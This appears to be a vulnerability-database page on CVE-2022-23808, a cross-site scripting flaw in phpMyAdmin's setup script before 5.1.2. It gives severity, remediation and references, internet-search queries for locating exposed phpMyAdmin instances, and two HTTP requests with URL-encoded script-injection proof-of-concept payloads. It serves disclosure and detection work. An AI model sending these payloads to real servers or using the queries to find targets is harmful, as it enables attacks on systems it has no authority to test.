---
layout: post
cve_id: CVE-2022-23808
title: phpMyAdmin < 5.1.2 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-23808.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-23808.yaml
snort2_rule: N/A
snort3_rule: N/A
author: cckuailong,daffainfo
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute malicious scripts in the context of the targeted user''s browser, potentially
  leading to session hijacking, data theft, or other malicious activities.

  '
remediation: 'Upgrade phpMyAdmin to version 5.1.2 or later to mitigate this vulnerability.

  '
reference:
- https://mp.weixin.qq.com/s/c2kwxwVUn1ym7oqv9Uio_A
- https://github.com/dipakpanchal456/CVE-2022-23808
- https://nvd.nist.gov/vuln/detail/CVE-2022-23808
- https://www.phpmyadmin.net/security/PMASA-2022-2/
- https://infosecwriteups.com/exploit-cve-2022-23808-85041c6e5b97
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-23808
  cwe-id: CWE-79
  epss-score: 0.68413
  epss-percentile: 0.98548
  cpe: cpe:2.3:a:phpmyadmin:phpmyadmin:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: phpmyadmin
  product: phpmyadmin
  shodan-query:
  - http.component:"phpmyadmin"
  - http.title:"phpmyadmin"
  - cpe:"cpe:2.3:a:phpmyadmin:phpmyadmin"
  fofa-query:
  - title="phpmyadmin"
  - body="pma_servername" && body="4.8.4"
  google-query: intitle:"phpmyadmin"
  hunter-query: app.name="phpmyadmin"&&web.body="pma_servername"&&web.body="4.8.4"
tags:
- cve
- cve2022
- phpmyadmin
- xss
- vuln
---

## ðŸ” Vulnerability Description
An issue was discovered in phpMyAdmin 5.1 before 5.1.2 that could allow an attacker to inject malicious code into aspects of the setup script, which can allow cross-site or HTML injection.

## ðŸŒ HTTP Request
```nohighlight
GET /phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

